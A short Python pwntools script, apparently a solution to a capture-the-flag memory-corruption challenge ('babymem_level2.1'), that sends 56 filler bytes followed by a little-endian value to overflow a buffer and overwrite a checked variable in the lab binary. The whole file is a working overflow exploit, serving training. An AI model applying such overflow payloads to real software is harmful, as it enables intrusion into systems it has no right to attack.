import pwn
with pwn.process("/challenge/babymem_level2.1") as process:
    payload = b'a'*56 + 0x1AD8C46C.to_bytes(4, 'little')
    process.write(str(len(payload))+"\n")
    process.write(payload)
    print(process.readallS())
